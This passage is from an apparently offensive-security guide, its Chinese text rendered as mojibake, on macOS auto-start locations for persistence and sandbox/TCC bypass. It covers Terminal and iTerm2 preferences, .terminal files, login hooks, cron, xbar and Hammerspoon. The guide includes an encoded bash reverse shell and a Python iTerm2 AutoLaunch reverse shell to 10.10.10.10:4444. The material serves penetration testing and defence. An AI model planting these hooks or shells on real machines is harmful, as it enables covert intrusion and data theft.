<p>è¦<strong>å°†åº”ç”¨ç¨‹åºæ·»åŠ åˆ°æ­¤åˆ—è¡¨</strong>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash"># Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
<h3 id="terminal-preferences"><a class="header" href="#terminal-preferences">Terminal Preferences</a></h3>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ç»ˆç«¯ä½¿ç”¨ç”¨æˆ·çš„ FDA æƒé™</li>
</ul>
<h4 id="location"><a class="header" href="#location">Location</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong></li>
<li><strong>Trigger</strong>: æ‰“å¼€ç»ˆç«¯</li>
</ul>
<h4 id="description--exploitation"><a class="header" href="#description--exploitation">Description &amp; Exploitation</a></h4>
<p>åœ¨ <strong><code>~/Library/Preferences</code></strong> ä¸­å­˜å‚¨ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­çš„åå¥½è®¾ç½®ã€‚è¿™äº›åå¥½è®¾ç½®ä¸­çš„ä¸€äº›å¯ä»¥åŒ…å« <strong>æ‰§è¡Œå…¶ä»–åº”ç”¨ç¨‹åº/è„šæœ¬</strong> çš„é…ç½®ã€‚</p>
<p>ä¾‹å¦‚ï¼Œç»ˆç«¯å¯ä»¥åœ¨å¯åŠ¨æ—¶æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼š</p>
<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
<p>æ­¤é…ç½®åœ¨æ–‡ä»¶ <strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong> ä¸­åæ˜ å¦‚ä¸‹:</p>
<pre><code class="language-bash">[...]
"Window Settings" =&gt; {
"Basic" =&gt; {
"CommandString" =&gt; "touch /tmp/terminal_pwn"
"Font" =&gt; {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" =&gt; 1
"FontWidthSpacing" =&gt; 1.004032258064516
"name" =&gt; "Basic"
"ProfileCurrentVersion" =&gt; 2.07
"RunCommandAsShell" =&gt; 0
"type" =&gt; "Window Settings"
}
[...]
</code></pre>
<p>æ‰€ä»¥ï¼Œå¦‚æœç³»ç»Ÿä¸­ç»ˆç«¯çš„åå¥½è®¾ç½®çš„plistå¯ä»¥è¢«è¦†ç›–ï¼Œé‚£ä¹ˆ**<code>open</code><strong>åŠŸèƒ½å¯ä»¥ç”¨æ¥</strong>æ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œè¯¥å‘½ä»¤**ã€‚</p>
<p>æ‚¨å¯ä»¥é€šè¿‡cliæ·»åŠ æ­¤å†…å®¹ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
</code></pre>
<p>{% endcode %}</p>
<h3 id="ç»ˆç«¯è„šæœ¬--å…¶ä»–æ–‡ä»¶æ‰©å±•å"><a class="header" href="#ç»ˆç«¯è„šæœ¬--å…¶ä»–æ–‡ä»¶æ‰©å±•å">ç»ˆç«¯è„šæœ¬ / å…¶ä»–æ–‡ä»¶æ‰©å±•å</a></h3>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ç»ˆç«¯ä½¿ç”¨ç”¨æˆ·çš„ FDA æƒé™</li>
</ul>
<h4 id="ä½ç½®-3"><a class="header" href="#ä½ç½®-3">ä½ç½®</a></h4>
<ul>
<li><strong>ä»»ä½•åœ°æ–¹</strong></li>
<li><strong>è§¦å‘</strong>: æ‰“å¼€ç»ˆç«¯</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-3"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-3">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>å¦‚æœä½ åˆ›å»ºä¸€ä¸ª <a href="https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx"><strong><code>.terminal</code></strong> è„šæœ¬</a> å¹¶æ‰“å¼€ï¼Œ<strong>ç»ˆç«¯åº”ç”¨ç¨‹åº</strong>å°†è‡ªåŠ¨è°ƒç”¨ä»¥æ‰§è¡Œå…¶ä¸­æŒ‡ç¤ºçš„å‘½ä»¤ã€‚å¦‚æœç»ˆç«¯åº”ç”¨ç¨‹åºå…·æœ‰æŸäº›ç‰¹æ®Šæƒé™ï¼ˆä¾‹å¦‚ TCCï¼‰ï¼Œä½ çš„å‘½ä»¤å°†ä»¥è¿™äº›ç‰¹æ®Šæƒé™è¿è¡Œã€‚</p>
<p>å°è¯•ä½¿ç”¨:</p>
<pre><code class="language-bash"># Prepare the payload
cat &gt; /tmp/test.terminal &lt;&lt; EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;CommandString&lt;/key&gt;
&lt;string&gt;mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;&lt;/string&gt;
&lt;key&gt;ProfileCurrentVersion&lt;/key&gt;
&lt;real&gt;2.0600000000000001&lt;/real&gt;
&lt;key&gt;RunCommandAsShell&lt;/key&gt;
&lt;false/&gt;
&lt;key&gt;name&lt;/key&gt;
&lt;string&gt;exploit&lt;/string&gt;
&lt;key&gt;type&lt;/key&gt;
&lt;string&gt;Window Settings&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
&lt;string&gt;echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;&lt;/string&gt;
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ‰©å±•å <strong><code>.command</code></strong>ã€<strong><code>.tool</code></strong>ï¼Œå¹¶åŒ…å«å¸¸è§„ shell è„šæœ¬å†…å®¹ï¼Œå®ƒä»¬ä¹Ÿå°†ç”±ç»ˆç«¯æ‰“å¼€ã€‚</p>
<p>{% hint style="danger" %}
å¦‚æœç»ˆç«¯å…·æœ‰ <strong>å®Œå…¨ç£ç›˜è®¿é—®æƒé™</strong>ï¼Œå®ƒå°†èƒ½å¤Ÿå®Œæˆè¯¥æ“ä½œï¼ˆè¯·æ³¨æ„ï¼Œæ‰§è¡Œçš„å‘½ä»¤å°†åœ¨ç»ˆç«¯çª—å£ä¸­å¯è§ï¼‰ã€‚
{% endhint %}</p>
<h3 id="éŸ³é¢‘æ’ä»¶"><a class="header" href="#éŸ³é¢‘æ’ä»¶">éŸ³é¢‘æ’ä»¶</a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0013/">https://theevilbit.github.io/beyond/beyond_0013/</a><br />
å†™ä½œ: <a href="https://posts.specterops.io/audio-unit-plug-ins-896d3434a882">https://posts.specterops.io/audio-unit-plug-ins-896d3434a882</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>æ‚¨å¯èƒ½ä¼šè·å¾—ä¸€äº›é¢å¤–çš„ TCC è®¿é—®æƒé™</li>
</ul>
<h4 id="ä½ç½®-4"><a class="header" href="#ä½ç½®-4">ä½ç½®</a></h4>
<ul>
<li><strong><code>/Library/Audio/Plug-Ins/HAL</code></strong></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: é‡å¯ coreaudiod æˆ–è®¡ç®—æœº</li>
<li><strong><code>/Library/Audio/Plug-ins/Components</code></strong></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: é‡å¯ coreaudiod æˆ–è®¡ç®—æœº</li>
<li><strong><code>~/Library/Audio/Plug-ins/Components</code></strong></li>
<li><strong>è§¦å‘</strong>: é‡å¯ coreaudiod æˆ–è®¡ç®—æœº</li>
<li><strong><code>/System/Library/Components</code></strong></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: é‡å¯ coreaudiod æˆ–è®¡ç®—æœº</li>
</ul>
<h4 id="æè¿°"><a class="header" href="#æè¿°">æè¿°</a></h4>
<p>æ ¹æ®ä¹‹å‰çš„å†™ä½œï¼Œå¯ä»¥ <strong>ç¼–è¯‘ä¸€äº›éŸ³é¢‘æ’ä»¶</strong> å¹¶ä½¿å…¶åŠ è½½ã€‚</p>
<h3 id="quicklook-æ’ä»¶"><a class="header" href="#quicklook-æ’ä»¶">QuickLook æ’ä»¶</a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>æ‚¨å¯èƒ½ä¼šè·å¾—ä¸€äº›é¢å¤–çš„ TCC è®¿é—®æƒé™</li>
</ul>
<h4 id="ä½ç½®-5"><a class="header" href="#ä½ç½®-5">ä½ç½®</a></h4>
<ul>
<li><code>/System/Library/QuickLook</code></li>
<li><code>/Library/QuickLook</code></li>
<li><code>~/Library/QuickLook</code></li>
<li><code>/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
<li><code>~/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-4"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-4">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>å½“æ‚¨ <strong>è§¦å‘æ–‡ä»¶çš„é¢„è§ˆ</strong>ï¼ˆåœ¨ Finder ä¸­é€‰æ‹©æ–‡ä»¶åæŒ‰ç©ºæ ¼é”®ï¼‰å¹¶ä¸”å®‰è£…äº† <strong>æ”¯æŒè¯¥æ–‡ä»¶ç±»å‹çš„æ’ä»¶</strong> æ—¶ï¼Œå¯ä»¥æ‰§è¡Œ QuickLook æ’ä»¶ã€‚</p>
<p>å¯ä»¥ç¼–è¯‘æ‚¨è‡ªå·±çš„ QuickLook æ’ä»¶ï¼Œå°†å…¶æ”¾ç½®åœ¨ä¸Šè¿°ä½ç½®ä¹‹ä¸€ä»¥åŠ è½½ï¼Œç„¶åè½¬åˆ°æ”¯æŒçš„æ–‡ä»¶å¹¶æŒ‰ç©ºæ ¼é”®ä»¥è§¦å‘å®ƒã€‚</p>
<h3 id="ç™»å½•æ³¨é”€é’©å­"><a class="header" href="#ç™»å½•æ³¨é”€é’©å­"><del>ç™»å½•/æ³¨é”€é’©å­</del></a></h3>
<p>{% hint style="danger" %}
è¿™å¯¹æˆ‘ä¸èµ·ä½œç”¨ï¼Œæ— è®ºæ˜¯ç”¨æˆ· LoginHook è¿˜æ˜¯ root LogoutHook
{% endhint %}</p>
<p><strong>å†™ä½œ</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0022/">https://theevilbit.github.io/beyond/beyond_0022/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-6"><a class="header" href="#ä½ç½®-6">ä½ç½®</a></h4>
<ul>
<li>æ‚¨éœ€è¦èƒ½å¤Ÿæ‰§è¡Œç±»ä¼¼ <code>defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh</code> çš„å‘½ä»¤</li>
<li>ä½äº <code>~/Library/Preferences/com.apple.loginwindow.plist</code></li>
</ul>
<p>å®ƒä»¬å·²è¢«å¼ƒç”¨ï¼Œä½†å¯ä»¥åœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œå‘½ä»¤ã€‚</p>
<pre><code class="language-bash">cat &gt; $HOME/hook.sh &lt;&lt; EOF
#!/bin/bash
echo 'My is: \`id\`' &gt; /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
</code></pre>
<p>æ­¤è®¾ç½®å­˜å‚¨åœ¨ <code>/Users/$USER/Library/Preferences/com.apple.loginwindow.plist</code></p>
<pre><code class="language-bash">defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
</code></pre>
<p>è¦åˆ é™¤å®ƒï¼š</p>
<pre><code class="language-bash">defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
</code></pre>
<p>The root user one is stored in <strong><code>/private/var/root/Library/Preferences/com.apple.loginwindow.plist</code></strong></p>
<h2 id="æ¡ä»¶æ²™ç®±ç»•è¿‡"><a class="header" href="#æ¡ä»¶æ²™ç®±ç»•è¿‡">æ¡ä»¶æ²™ç®±ç»•è¿‡</a></h2>
<p>{% hint style="success" %}
åœ¨è¿™é‡Œæ‚¨å¯ä»¥æ‰¾åˆ°å¯¹<strong>æ²™ç®±ç»•è¿‡</strong>æœ‰ç”¨çš„å¯åŠ¨ä½ç½®ï¼Œè¿™å…è®¸æ‚¨é€šè¿‡<strong>å°†å…¶å†™å…¥æ–‡ä»¶</strong>å¹¶<strong>æœŸæœ›ä¸å¤ªå¸¸è§çš„æ¡ä»¶</strong>ï¼ˆå¦‚ç‰¹å®šçš„<strong>å·²å®‰è£…ç¨‹åº</strong>ã€"ä¸å¸¸è§"ç”¨æˆ·<strong>æ“ä½œ</strong>æˆ–ç¯å¢ƒï¼‰æ¥ç®€å•åœ°æ‰§è¡ŒæŸäº›æ“ä½œã€‚
{% endhint %}</p>
<h3 id="cron"><a class="header" href="#cron">Cron</a></h3>
<p><strong>å†™ä½œ</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0004/">https://theevilbit.github.io/beyond/beyond_0004/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç®±: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†æ˜¯ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿæ‰§è¡Œ<code>crontab</code>äºŒè¿›åˆ¶æ–‡ä»¶</li>
<li>æˆ–è€…æ˜¯root</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-7"><a class="header" href="#ä½ç½®-7">ä½ç½®</a></h4>
<ul>
<li><strong><code>/usr/lib/cron/tabs/</code>, <code>/private/var/at/tabs</code>, <code>/private/var/at/jobs</code>, <code>/etc/periodic/</code></strong></li>
<li>ç›´æ¥å†™å…¥è®¿é—®éœ€è¦rootã€‚å¦‚æœæ‚¨å¯ä»¥æ‰§è¡Œ<code>crontab &lt;file&gt;</code>ï¼Œåˆ™ä¸éœ€è¦root</li>
<li><strong>è§¦å‘</strong>: å–å†³äºcronä½œä¸š</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-5"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-5">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>åˆ—å‡º<strong>å½“å‰ç”¨æˆ·</strong>çš„cronä½œä¸šï¼š</p>
<pre><code class="language-bash">crontab -l
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥åœ¨ <strong><code>/usr/lib/cron/tabs/</code></strong> å’Œ <strong><code>/var/at/tabs/</code></strong> ä¸­æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„ cron ä½œä¸šï¼ˆéœ€è¦ root æƒé™ï¼‰ã€‚</p>
<p>åœ¨ MacOS ä¸­ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ä»¥ <strong>ç‰¹å®šé¢‘ç‡</strong> æ‰§è¡Œè„šæœ¬çš„å¤šä¸ªæ–‡ä»¶å¤¹ï¼š</p>
<pre><code class="language-bash"># The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
</code></pre>
<p>åœ¨é‚£é‡Œæ‚¨å¯ä»¥æ‰¾åˆ°å¸¸è§„çš„ <strong>cron</strong> <strong>ä½œä¸š</strong>ã€<strong>at</strong> <strong>ä½œä¸š</strong>ï¼ˆä¸å¸¸ç”¨ï¼‰å’Œ <strong>å‘¨æœŸæ€§</strong> <strong>ä½œä¸š</strong>ï¼ˆä¸»è¦ç”¨äºæ¸…ç†ä¸´æ—¶æ–‡ä»¶ï¼‰ã€‚æ¯æ—¥å‘¨æœŸæ€§ä½œä¸šå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰§è¡Œï¼š<code>periodic daily</code>ã€‚</p>
<p>è¦ä»¥ç¼–ç¨‹æ–¹å¼æ·»åŠ  <strong>ç”¨æˆ· cronjob</strong>ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">echo '* * * * * /bin/bash -c "touch /tmp/cron3"' &gt; /tmp/cron
crontab /tmp/cron
</code></pre>
<h3 id="iterm2"><a class="header" href="#iterm2">iTerm2</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0002/">https://theevilbit.github.io/beyond/beyond_0002/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>iTerm2 æ›¾ç»æ‹¥æœ‰æˆäºˆçš„ TCC æƒé™</li>
</ul>
<h4 id="locations"><a class="header" href="#locations">Locations</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong></li>
<li><strong>è§¦å‘å™¨</strong>: æ‰“å¼€ iTerm</li>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong></li>
<li><strong>è§¦å‘å™¨</strong>: æ‰“å¼€ iTerm</li>
<li><strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong></li>
<li><strong>è§¦å‘å™¨</strong>: æ‰“å¼€ iTerm</li>
</ul>
<h4 id="description--exploitation-1"><a class="header" href="#description--exploitation-1">Description &amp; Exploitation</a></h4>
<p>å­˜å‚¨åœ¨ <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong> ä¸­çš„è„šæœ¬å°†è¢«æ‰§è¡Œã€‚ä¾‹å¦‚:</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
</code></pre>
<p>æˆ–ï¼š</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" &lt;&lt; EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
</code></pre>
<p>è¯¥è„šæœ¬ <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong> ä¹Ÿå°†è¢«æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">do shell script "touch /tmp/iterm2-autolaunchscpt"
</code></pre>
<p>iTerm2 çš„åå¥½è®¾ç½®ä½äº <strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong>ï¼Œå¯ä»¥ <strong>æŒ‡ç¤ºåœ¨æ‰“å¼€ iTerm2 ç»ˆç«¯æ—¶æ‰§è¡Œçš„å‘½ä»¤</strong>ã€‚</p>
<p>æ­¤è®¾ç½®å¯ä»¥åœ¨ iTerm2 è®¾ç½®ä¸­é…ç½®ï¼š</p>
<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
<p>è¯¥å‘½ä»¤åœ¨åå¥½è®¾ç½®ä¸­åæ˜ ï¼š</p>
<pre><code class="language-bash">plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" =&gt; [
0 =&gt; {
[...]
"Initial Text" =&gt; "touch /tmp/iterm-start-command"
</code></pre>
<p>æ‚¨å¯ä»¥è®¾ç½®è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="warning" %}
é«˜åº¦å¯èƒ½è¿˜æœ‰<strong>å…¶ä»–æ–¹æ³•æ»¥ç”¨iTerm2é¦–é€‰é¡¹</strong>ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
{% endhint %}</p>
<h3 id="xbar"><a class="header" href="#xbar">xbar</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0007/">https://theevilbit.github.io/beyond/beyond_0007/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†å¿…é¡»å®‰è£…xbar</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>å®ƒè¯·æ±‚è¾…åŠ©åŠŸèƒ½æƒé™</li>
</ul>
<h4 id="ä½ç½®-8"><a class="header" href="#ä½ç½®-8">ä½ç½®</a></h4>
<ul>
<li><strong><code>~/Library/Application\ Support/xbar/plugins/</code></strong></li>
<li><strong>è§¦å‘</strong>: ä¸€æ—¦æ‰§è¡Œxbar</li>
</ul>
<h4 id="æè¿°-1"><a class="header" href="#æè¿°-1">æè¿°</a></h4>
<p>å¦‚æœå®‰è£…äº†æµè¡Œç¨‹åº<a href="https://github.com/matryer/xbar"><strong>xbar</strong></a>ï¼Œå¯ä»¥åœ¨**<code>~/Library/Application\ Support/xbar/plugins/</code>**ä¸­ç¼–å†™ä¸€ä¸ªshellè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†åœ¨å¯åŠ¨xbaræ—¶æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/xbar/plugins/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
</code></pre>
<h3 id="hammerspoon"><a class="header" href="#hammerspoon">Hammerspoon</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0008/">https://theevilbit.github.io/beyond/beyond_0008/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†å¿…é¡»å®‰è£… Hammerspoon</li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>å®ƒè¯·æ±‚è¾…åŠ©åŠŸèƒ½æƒé™</li>
</ul>
<h4 id="location-1"><a class="header" href="#location-1">Location</a></h4>
<ul>
<li><strong><code>~/.hammerspoon/init.lua</code></strong></li>
<li><strong>Trigger</strong>: ä¸€æ—¦æ‰§è¡Œ hammerspoon</li>
</ul>
<h4 id="description"><a class="header" href="#description">Description</a></h4>
<p><a href="https://github.com/Hammerspoon/hammerspoon"><strong>Hammerspoon</strong></a> ä½œä¸º <strong>macOS</strong> çš„è‡ªåŠ¨åŒ–å¹³å°ï¼Œåˆ©ç”¨ <strong>LUA è„šæœ¬è¯­è¨€</strong> è¿›è¡Œæ“ä½œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®ƒæ”¯æŒå®Œæ•´çš„ AppleScript ä»£ç é›†æˆå’Œ shell è„šæœ¬çš„æ‰§è¡Œï¼Œæ˜¾è‘—å¢å¼ºäº†å…¶è„šæœ¬èƒ½åŠ›ã€‚</p>
<p>è¯¥åº”ç”¨ç¨‹åºæŸ¥æ‰¾ä¸€ä¸ªæ–‡ä»¶ <code>~/.hammerspoon/init.lua</code>ï¼Œå¹¶åœ¨å¯åŠ¨æ—¶æ‰§è¡Œè¯¥è„šæœ¬ã€‚</p>
<pre><code class="language-bash">mkdir -p "$HOME/.hammerspoon"
cat &gt; "$HOME/.hammerspoon/init.lua" &lt;&lt; EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
</code></pre>
<h3 id="bettertouchtool"><a class="header" href="#bettertouchtool">BetterTouchTool</a></h3>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†å¿…é¡»å®‰è£…BetterTouchTool</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>å®ƒè¯·æ±‚è‡ªåŠ¨åŒ–å¿«æ·æ–¹å¼å’Œè¾…åŠ©åŠŸèƒ½æƒé™</li>
</ul>
<h4 id="ä½ç½®-9"><a class="header" href="#ä½ç½®-9">ä½ç½®</a></h4>
<ul>
<li><code>~/Library/Application Support/BetterTouchTool/*</code></li>
</ul>
<p>è¯¥å·¥å…·å…è®¸æŒ‡ç¤ºåœ¨æŒ‰ä¸‹æŸäº›å¿«æ·é”®æ—¶æ‰§è¡Œçš„åº”ç”¨ç¨‹åºæˆ–è„šæœ¬ã€‚æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåœ¨æ•°æ®åº“ä¸­é…ç½®è‡ªå·±çš„<strong>å¿«æ·é”®å’Œè¦æ‰§è¡Œçš„æ“ä½œ</strong>ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå¿«æ·é”®å¯ä»¥åªæ˜¯æŒ‰ä¸‹ä¸€ä¸ªé”®ï¼‰ã€‚</p>
<h3 id="alfred"><a class="header" href="#alfred">Alfred</a></h3>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†å¿…é¡»å®‰è£…Alfred</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>å®ƒè¯·æ±‚è‡ªåŠ¨åŒ–ã€è¾…åŠ©åŠŸèƒ½ç”šè‡³å®Œå…¨ç£ç›˜è®¿é—®æƒé™</li>
</ul>
<h4 id="ä½ç½®-10"><a class="header" href="#ä½ç½®-10">ä½ç½®</a></h4>
<ul>
<li><code>???</code></li>
</ul>
<p>å®ƒå…è®¸åˆ›å»ºåœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶å¯ä»¥æ‰§è¡Œä»£ç çš„å·¥ä½œæµã€‚æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªå·¥ä½œæµæ–‡ä»¶å¹¶ä½¿AlfredåŠ è½½å®ƒï¼ˆéœ€è¦æ”¯ä»˜é«˜çº§ç‰ˆæœ¬æ‰èƒ½ä½¿ç”¨å·¥ä½œæµï¼‰ã€‚</p>
<h3 id="sshrc"><a class="header" href="#sshrc">SSHRC</a></h3>
